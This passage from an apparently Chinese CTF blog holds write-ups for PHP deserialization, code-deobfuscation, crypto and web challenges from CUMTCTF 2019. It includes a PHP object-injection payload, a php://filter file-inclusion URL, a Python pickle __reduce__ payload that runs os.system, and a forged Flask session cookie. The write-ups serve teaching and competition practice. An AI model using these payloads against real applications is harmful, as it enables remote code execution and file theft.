title=\"0x1  what？？\"></a>0x1  what？？</h2><p>一个代码审计问题,与反序列化有关</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\">@error_reporting(<span class=\"number\">1</span>); </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">sky</span> </span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;      </span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $skyobj;  </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span> </span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;          </span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;skyobj = <span class=\"keyword\">new</span> sec;     </span><br><span class=\"line\">       &#125;  </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span><span class=\"params\">()</span>      </span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;          </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;skyobj))  </span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">nosec</span> </span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> $filename;      </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">read</span><span class=\"params\">()</span>      </span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;    </span><br><span class=\"line\">        $file = <span class=\"string\">\"./&#123;$this-&gt;filename&#125;\"</span>;        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (file_get_contents($file))         </span><br><span class=\"line\">        &#123;              </span><br><span class=\"line\">            <span class=\"keyword\">return</span> file_get_contents($file); </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">        <span class=\"keyword\">else</span> </span><br><span class=\"line\">        &#123; </span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">\"you must be joking!\"</span>; </span><br><span class=\"line\">        &#125;      </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">sec</span> </span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;  </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">read</span><span class=\"params\">()</span>     </span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;          </span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"it's so sec~~\"</span>;      </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'data'</span>]))  </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    $Input_data = unserialize($_GET[<span class=\"string\">'data'</span>]);  </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $Input_data; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>PHP序列化的目的旨在实现不同的PHP文件之间的对象传递，在序列化对象创建之前，如果类中定义了&#95;&#95;sleep()函数，则会调用该函数，而在序列化对象创建时则会调用&#95;&#95;wakeup()函数（如果定义了的话），当然，还有PHP许多其他的魔法方法。<br>分析一下，该例中关键应该在read函数上，但是必须要调用到nosec才可以实现，该例中sky类中默认创建sec类，显示是不行的，必须要创建出nosec才可以用。</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\">@error_reporting(<span class=\"number\">1</span>); </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">sky</span> </span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;      </span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $skyobj;  </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span> </span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;          </span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;skyobj = <span class=\"keyword\">new</span> nosec;<span class=\"comment\">//在此处更改对象，实现对象的绕过     </span></span><br><span class=\"line\">       &#125;  </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span><span class=\"params\">()</span>      </span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;          </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;skyobj))  </span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">nosec</span> </span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> $filename=<span class=\"string\">'flag.php'</span>;      </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$obj = <span class=\"keyword\">new</span> sky();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> urlencode(serialize($obj)) <span class=\"comment\">//千万记住url编码，真的太多坑！！！！</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>O%3A3%3A%22sky%22%3A1%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A5%3A%22nosec%22%3A1%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D</p>\n</blockquote>\n<p>直接提交上去即可获得编码。<br>注意：以后一定要多检查元素，当时好像已经做出来了 ，可惜这个flag居然藏在控制台里面。<br>同理，还可以利用该函数的特性去实现写文件等等操作。</p>\n<h2 id=\"0x2-代码混淆\"><a href=\"#0x2-代码混淆\" class=\"headerlink\" title=\"0x2  代码混淆\"></a>0x2  代码混淆</h2><p>有个小知识点，vim会自动产生备份文件，比如文件名为submit.php，则产生的文件可能为.submit.swp，submit.php~，submit.php.bak多试试。<br>然后就开始解混淆代码。</p>\n<p>解混淆代码的时候，应该先把变量名提取出来，可以通过下面的代码dump变量出来</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">\"index.php\"</span>;</span><br><span class=\"line\">var_dump(get_defined_vars());</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>恢复出来的关键代码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$IIIIIIIIIIll = @$_GET[<span class=\"string\">'img_tet'</span>];</span><br><span class=\"line\">$IIIIIIIIIIll = htmlspecialchars($IIIIIIIIIIll);</span><br><span class=\"line\">$IIIIIIIIIIll = str_replace(<span class=\"string\">'flag'</span>,<span class=\"string\">\"\"</span>,$IIIIIIIIIIll);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($IIIIIIIIIIll!=<span class=\"string\">\"\"</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    header(<span class=\"string\">'Content-Type: imgage/jpeg'</span>);</span><br><span class=\"line\">    header(<span class=\"string\">'Content-Disposition: attachment; filename='</span>.$IIIIIIIIIIll);</span><br><span class=\"line\">    header(<span class=\"string\">'Content-Lengh: '</span>.filesize($IIIIIIIIIIll));</span><br><span class=\"line\">    $IIIIIIIIII11 = fopen($IIIIIIIIIIll,<span class=\"string\">\"r\"</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">\"Unable to open file!\"</span>);</span><br><span class=\"line\">    $IIIIIIIIIlIl = fread($IIIIIIIIII11,filesize($IIIIIIIIIIll));</span><br><span class=\"line\">    fclose($IIIIIIIIII11);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $IIIIIIIIIlIl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>题目过滤flag，所以可以用flflagag绕过，即可得到flag，这个题其实也不难，只是毕竟是我第一次，需要纪念一下。</p>\n","categories":["writeup"],"tags":["CTF"]},{"title":"CUMTCTF第三轮月赛与决赛","url":"/2019/05/22/cumtctf3/","content":"<h1 id=\"第三次双月赛题解\"><a href=\"#第三次双月赛题解\" class=\"headerlink\" title=\"第三次双月赛题解\"></a>第三次双月赛题解</h1><a id=\"more\"></a>\n<h2 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h2><h3 id=\"古典密码签到\"><a href=\"#古典密码签到\" class=\"headerlink\" title=\"古典密码签到\"></a>古典密码签到</h3><p>维吉尼亚密码，密文<code>juttaigykhpmjyreca</code>，秘钥<code>cumt</code>，在线解密即可<a href=\"https://www.qqxiuzi.cn/bianma/weijiniyamima.php\" target=\"_blank\" rel=\"noopener\">https://www.qqxiuzi.cn/bianma/weijiniyamima.php</a></p>\n<p>flag: <code>flag{hahayoufindtheflag}</code></p>\n<h3 id=\"encode\"><a href=\"#encode\" class=\"headerlink\" title=\"encode\"></a>encode</h3><p>题目给出的pyc文件，在线反编译一下即可得到源代码</p>\n<p>很简单的解密题，按照相反的逻辑解密即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># encoding: utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encode1</span><span class=\"params\">(ans)</span>:</span></span><br><span class=\"line\">    s = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ans:</span><br><span class=\"line\">        x = ord(i) ^ <span class=\"number\">36</span></span><br><span class=\"line\">        x = x + <span class=\"number\">25</span></span><br><span class=\"line\">        s += chr(x)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> s</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encode2</span><span class=\"params\">(ans)</span>:</span></span><br><span class=\"line\">    s = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ans:</span><br><span class=\"line\">        x = ord(i) + <span class=\"number\">36</span></span><br><span class=\"line\">        x = x ^ <span class=\"number\">36</span></span><br><span class=\"line\">        s += chr(x)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> s</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encode3</span><span class=\"params\">(ans)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> base64.b32encode(ans)</span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"string\">' '</span></span><br><span class=\"line\">final = <span class=\"string\">'LOQ2NJFYU5YH2WTUU5VHJIDXLJNVW2LQO52WS2L6PVUVW2TQLJNVSWLJUBN3E==='</span></span><br><span class=\"line\"><span class=\"comment\"># if encode3(encode2(encode1(flag))) == final:</span></span><br><span class=\"line\"><span class=\"comment\">#     print 'correct'</span></span><br><span class=\"line\"><span class=\"comment\"># else:</span></span><br><span class=\"line\"><span class=\"comment\">#     print 'wrong'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decode3</span><span class=\"params\">(ans)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> base64.b32decode(ans)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decode2</span><span class=\"params\">(ans)</span>:</span></span><br><span class=\"line\">    s = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ans:</span><br><span class=\"line\">        x = ord(i)</span><br><span class=\"line\">        x = x ^ <span class=\"number\">36</span></span><br><span class=\"line\">        x = x - <span class=\"number\">36</span></span><br><span class=\"line\">        s += chr(x)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decode1</span><span class=\"params\">(ans)</span>:</span></span><br><span class=\"line\">    s = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ans:</span><br><span class=\"line\">        x = ord(i)</span><br><span class=\"line\">        x = x - <span class=\"number\">25</span></span><br><span class=\"line\">        x = x ^ <span class=\"number\">36</span></span><br><span class=\"line\">        s += chr(x)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">print</span> decode1(decode2(decode3(final)))</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#123;b38e7b57c2eff432044984f53efdd4cf&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h2><h3 id=\"web签到1\"><a href=\"#web签到1\" class=\"headerlink\" title=\"web签到1\"></a>web签到1</h3><p>简单的文件包含即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;202.119.201.199:30100&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;cxk.php</span><br></pre></td></tr></table></figure>\n<p>flag{CumtCTF_this_iS_a_RElLy_fLaG!!!}</p>\n<h3 id=\"Web签到2\"><a href=\"#Web签到2\" class=\"headerlink\" title=\"Web签到2\"></a>Web签到2</h3><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">P</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $var;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(</span><br><span class=\"line\">            <span class=\"string\">'global '</span>.<span class=\"keyword\">$this</span> -&gt; <span class=\"keyword\">var</span>.<span class=\"string\">';'</span>.</span><br><span class=\"line\">            <span class=\"string\">'$ret = '</span>.<span class=\"keyword\">$this</span> -&gt; <span class=\"keyword\">var</span>.<span class=\"string\">';'</span></span><br><span class=\"line\">        );</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $ret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">K</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $fn;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $name;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'string'</span>;</span><br><span class=\"line\">        $fn = <span class=\"keyword\">$this</span> -&gt; fn;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $fn();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">U</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $obj;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;obj-&gt;name) || <span class=\"keyword\">$this</span>-&gt;obj-&gt;name != <span class=\"string\">\"iv4n\"</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span> -&gt; obj -&gt; fn = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;&#125;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> unserialize($_POST[<span class=\"string\">'obj'</span>])-&gt;obj;</span><br></pre></td></tr></table></figure>\n<p>flag{0k_y0u_4lr3ady_kn0w_uns3ria1ize}</p>\n<h3 id=\"Baby-Flask\"><a href=\"#Baby-Flask\" class=\"headerlink\" title=\"Baby Flask\"></a>Baby Flask</h3><p>flask项目的网站，查看源代码可以看到github网址，给出了网站源码，</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python3.6</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> base64 <span class=\"keyword\">import</span> b64decode</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, request, render_template, session</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># add secret key to enable session</span></span><br><span class=\"line\"><span class=\"comment\"># and this is a fake secret key, just an example</span></span><br><span class=\"line\">app.config[<span class=\"string\">'SECRET_KEY'</span>] = <span class=\"string\">'you_find_secret_key_congratulations'</span></span><br><span class=\"line\"></span><br><span class=\"line\">User = type(<span class=\"string\">'User'</span>, (object,), &#123;</span><br><span class=\"line\">    <span class=\"string\">'uname'</span>: <span class=\"string\">'test'</span>,</span><br><span class=\"line\">    <span class=\"string\">'is_admin'</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">'__repr__'</span>: <span class=\"keyword\">lambda</span> o: o.uname,</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/', methods=('GET',))</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index_handler</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> session.get(<span class=\"string\">'u'</span>):</span><br><span class=\"line\">        u = pickle.dumps(User())</span><br><span class=\"line\">        session[<span class=\"string\">'u'</span>] = u</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">'index.html'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/file', methods=('GET',))</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">file_handler</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    path = request.args.get(<span class=\"string\">'file'</span>)</span><br><span class=\"line\">    path = os.path.join(<span class=\"string\">'static'</span>, path)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(path) <span class=\"keyword\">or</span> os.path.isdir(path) \\</span><br><span class=\"line\">            <span class=\"keyword\">or</span> <span class=\"string\">'.py'</span> <span class=\"keyword\">in</span> path <span class=\"keyword\">or</span> <span class=\"string\">'.sh'</span> <span class=\"keyword\">in</span> path <span class=\"keyword\">or</span> <span class=\"string\">'..'</span> <span class=\"keyword\">in</span> path:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'disallowed'</span></span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(path, <span class=\"string\">'r'</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">        content = fp.read()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> content</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/admin', methods=('GET',))</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">admin_handler</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        u = session.get(<span class=\"string\">'u'</span>)</span><br><span class=\"line\">        print(pickle.loads(<span class=\"string\">b'\\x80\\x03cprogram_main_app@@@\\nUser\\nq\\x00)\\x81q\\x01.'</span>))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> isinstance(u, dict): </span><br><span class=\"line\">            u = b64decode(u.get(<span class=\"string\">'b'</span>))</span><br><span class=\"line\">        u = pickle.loads(u)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> u.is_admin == <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">'welcome, admin'</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">'who are you?'</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'uhh?'</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    app.run(<span class=\"string\">'0.0.0.0'</span>, port=<span class=\"number\">80</span>, debug=<span class=\"literal\">False</span>)</span><br></pre></td></tr></table></figure>\n<p>可以看到file路由处可以进行文件读取</p>\n<p><img src=\"https://i.loli.net/2019/05/04/5ccd332f17fc0.png\" alt></p>\n<p>查看历史提交记录可以看到某个版本中有如下语句</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">app.config[<span class=\"string\">'SECRET_KEY'</span>] = os.getenv(<span class=\"string\">'secret_key'</span>)</span><br></pre></td></tr></table></figure>\n<p>可以看到环境变量中写入了秘钥值，结合上面的文件读取漏洞，我们可以读取到该秘钥值，也可以知道用户是iv4n</p>\n<p><img src=\"https://i.loli.net/2019/05/04/5ccd33cc0a86f.png\" alt></p>\n<p>读取到秘钥就可以伪造session了，查看admin的代码可以知到此处利用了pickle模块，该模块可以进行序列化操作，而且也存在反序列化漏洞，可以利用<strong>reduce</strong>方法来进行命令执行</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span><span class=\"params\">(object)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__reduce__</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        a = <span class=\"string\">\"`ls / -l &gt; /home/iv4n/3.txt`\"</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> (os.system,(a,))</span><br><span class=\"line\"></span><br><span class=\"line\">u = pickle.dumps(User())</span><br><span class=\"line\">print(u)</span><br><span class=\"line\">bu = base64.b64encode(u)</span><br><span class=\"line\">print(bu)</span><br></pre></td></tr></table></figure>\n<p>这里坑的地方在于，当时我发现这个命令执行漏洞没有回显，所以我先尝试了反弹shell，结果bash反弹失败了，此处我尝试了将命令执行的结果写入文件中，然后读取文件即可，此处需要注意的是写入文件是有权限限制的，起初我想在根目录或者项目目录中写入文件，但是都失败了，估计是权限不够，必须找一个有权限的目录才行，我们前面已经知道了项目用户是iv4n，那么我们直接写入该用户的目录下不就行了，用上面的命令输出值之后进行session伪造即可（使用base64是为了防止编码问题）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">py flask_session_cookie_manager3.py encode -s you_find_secret_key_congratulations -t &#123;&#39;u&#39;:&#123;&#39;b&#39;:b&#39;gANjcG9zaXgKc3lzdGVtCnEAWD0AAABgY2F0IC9mMWxsMWxsMTQ0NGFhYWcvZjFsbDFsbDE0NDRhYWFnID4gL2hvbWUvaXY0di9ndWVzcy50eHRgcQGFcQJScQMu&#39;&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>然后修改cookie，刷新admin页面，然后去读文件</p>\n<p><img src=\"https://i.loli.net/2019/05/04/5ccd37814e80f.png\" alt></p>\n<p>可以看到flag文件，直接读取即可</p>\n<p><img src=\"https://i.loli.net/2019/05/04/5ccd37ed7cf35.png\" alt></p>\n<blockquote>\n<p>PS：反弹shell失败的原因在于我使用的是bash反弹shell，而题目环境中没有bash而是sh，而且也没有/dev/tcp文件，可以通过fork子进程来进行反弹shell</p>\n</blockquote>\n<p>我走的一个弯路在于一直想以admin身份登录（虽然登录之后毛都没有），但是一直报错，记录一下自己的方法</p>\n<p>pickle模块在序列化类的时候，是不会序列化具体值的，我们解密cookie的值为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&#39;u&#39;:b&#39;\\x80\\x03cprogram_main_app@@@\\nUser\\nq\\x00)\\x81q\\x01.&#39;&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看到并没有包含User的具体字段的信息，换句话说我们即使本地修改了<code>is_admin</code>的值，在服务器端反序列化之后也并没有被记录，而是直接以代码中的定义来初始化，也就是</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">User = type(<span class=\"string\">'User'</span>, (object,), &#123;</span><br><span class=\"line\">    <span class=\"string\">'uname'</span>: <span class=\"string\">'test'</span>,</span><br><span class=\"line\">    <span class=\"string\">'is_admin'</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">'__repr__'</span>: <span class=\"keyword\">lambda</span> o: o.uname,</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p><code>is_admin</code>又被初始化为0了，所以我们无法登陆成功，那么怎么解决这个问题呢？</p>\n<p>我们可以通过将<code>is_admin</code>设置为类属性来解决</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span><span class=\"params\">(object)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        self.a = <span class=\"number\">2</span></span><br><span class=\"line\">        self.is_admin = <span class=\"number\">1</span></span><br><span class=\"line\">a=User()</span><br><span class=\"line\">c=pickle.dumps(a)</span><br><span class=\"line\">print(c)</span><br><span class=\"line\">print(base64.b64encode(c))</span><br><span class=\"line\">pickle.loads(c)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">b&#39;\\x80\\x03c__main__\\nUser\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x01\\x00\\x00\\x00aq\\x03K\\x02X\\x08\\x00\\x00\\x00is_adminq\\x04K\\x01ub.&#39;</span><br></pre></td></tr></table></figure>\n<p>可以看到<code>is_admin</code>被序列化了（个人理解是dump方法会序列化类的属性），然后需要注意一点，上面的输出包含<code>__mian__</code>，和我们从网站解密的对比一下</p>\n<blockquote>\n<p>b’\\x80\\x03cprogram_main_app@@@\\nUser\\nq\\x00)\\x81q\\x01.’ </p>\n</blockquote>\n<p>同样位置是<code>program_main_app@@@</code>，这应该是模块名，如果不对应的化反序列化会失败，此处我们也需要进行相应的修改，最终如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">b&#39;\\x80\\x03cprogram_main_app@@@\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x01\\x00\\x00\\x00aq\\x03K\\x02X\\x08\\x00\\x00\\x00is_adminq\\x04K\\x01ub.&#39;</span><br></pre></td></tr></table></figure>\n<h1 id=\"CUMTCTF-FINAL-2019\"><a href=\"#CUMTCTF-FINAL-2019\" class=\"headerlink\" title=\"CUMTCTF_FINAL_2019\"></a>CUMTCTF_FINAL_2019</h1><h2 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h2><h3 id=\"委屈的兔兔\"><a href=\"#委屈的兔兔\" class=\"headerlink\" title=\"委屈的兔兔\"></a>委屈的兔兔</h3><p>打开图片，查看16进制即可在尾部看到unicode编码，解码即可得到flag</p>\n<p>key{you are right}</p>\n<h3 id=\"两岁半的猪\"><a href=\"#两岁半的猪\" class=\"headerlink\" title=\"两岁半的猪\"></a>两岁半的猪</h3><p>拖进stegsolve就会简单移位就可以看到二维码</p>\n<p>flag{AppLeU0}</p>\n<h3 